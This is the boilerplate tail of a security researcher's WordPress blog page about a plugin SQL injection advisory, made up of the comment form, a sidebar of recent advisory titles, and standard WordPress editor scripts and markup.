				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/#respond" style="display:none;">Cancel reply</a></small></h3>
									<p class="must-log-in">You must be <a href="http://ceriksen.com/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F07%2F25%2Fwordpress-symposium-plugin-multiple-sql-injection-vulnerabilities%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
			
</div><!-- #comments -->

			
			</div><!-- #content -->
		</div><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->

<link rel='stylesheet' id='wp-jquery-ui-dialog-css'  href='http://ceriksen.com/wp-includes/css/jquery-ui-dialog.min.css?ver=3.8.3' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var wordCountL10n = {"type":"w"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-admin/js/word-count.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.widget.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.mouse.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.resizable.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.draggable.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.button.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.position.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.dialog.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/wpdialog.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No matches found."};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/wplink.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/popup.min.js?ver=3.8.3'></script>

	<script type="text/javascript">
		tinyMCEPreInit = {
			base : "",
			suffix : "",
			query : "ver=359-20131026",
			mceInit : {},
			qtInit : {'comment':{id:"comment",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,more,close"}},
			ref : {plugins:"",theme:"advanced",language:""},
			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
		};
	</script>

	<script type="text/javascript">
		var wpActiveEditor;

		(function(){
			var init, ed, qt, first_init, DOM, el, i, mce = 0;

			if ( typeof(tinymce) == 'object' ) {
				DOM = tinymce.DOM;
				// mark wp_theme/ui.css as loaded
				DOM.files[tinymce.baseURI.getURI() + '/themes/advanced/skins/wp_theme/ui.css'] = true;

				DOM.events.add( DOM.select('.wp-editor-wrap'), 'mousedown', function(e){
					if ( this.id )
						wpActiveEditor = this.id.slice(3, -5);
				});

				for ( ed in tinyMCEPreInit.mceInit ) {
					if ( first_init ) {
						init = tinyMCEPreInit.mceInit[ed] = tinymce.extend( {}, first_init, tinyMCEPreInit.mceInit[ed] );
					} else {
						init = first_init = tinyMCEPreInit.mceInit[ed];
					}

					if ( mce )
						try { tinymce.init(init); } catch(e){}
				}
			} else {
				if ( tinyMCEPreInit.qtInit ) {
					for ( i in tinyMCEPreInit.qtInit ) {
						el = tinyMCEPreInit.qtInit[i].id;
						if ( el )
							document.getElementById('wp-'+el+'-wrap').onmousedown = function(){ wpActiveEditor = this.id.slice(3, -5); }
					}
				}
			}

			if ( typeof(QTags) == 'function' ) {
				for ( qt in tinyMCEPreInit.qtInit ) {
					try { quicktags( tinyMCEPreInit.qtInit[qt] ); } catch(e){}
				}
			}
		})();
		var ajaxurl = "/wp-admin/admin-ajax.php";		</script>
			<div style="display:none;">
	<form id="wp-link" tabindex="-1">
	<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="a25a108328" />	<div id="link-selector">
		<div id="link-options">
			<p class="howto">Enter the destination URL</p>
			<div>
				<label><span>URL</span><input id="url-field" type="text" name="href" /></label>
			</div>
			<div>
				<label><span>Title</span><input id="link-title-field" type="text" name="linktitle" /></label>
			</div>
			<div class="link-target">
				<label><input type="checkbox" id="link-target-checkbox" /> Open link in a new window/tab</label>
			</div>
		</div>
				<p class="howto toggle-arrow " id="internal-toggle">Or link to existing content</p>
		<div id="search-panel" style="display:none">
			<div class="link-search-wrapper">
				<label>
					<span class="search-label">Search</span>
					<input type="search" id="search-field" class="link-search-field" autocomplete="off" />
					<span class="spinner"></span>
				</label>
			</div>
			<div id="search-results" class="query-results">
				<ul></ul>
				<div class="river-waiting">
					<span class="spinner"></span>
				</div>
			</div>
			<div id="most-recent-results" class="query-results">
				<div class="query-notice"><em>No search term specified. Showing recent items.</em></div>
				<ul></ul>
				<div class="river-waiting">
					<span class="spinner"></span>
				</div>
			</div>
		</div>
	</div>
	<div class="submitbox">
		<div id="wp-link-update">
			<input type="submit" value="Add Link" class="button-primary" id="wp-link-submit" name="wp-link-submit">
		</div>
		<div id="wp-link-cancel">
			<a class="submitdelete deletion" href="#">Cancel</a>
		</div>
	</div>
	</form>
	</div>
	
</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:40:18 by W3 Total Cache -->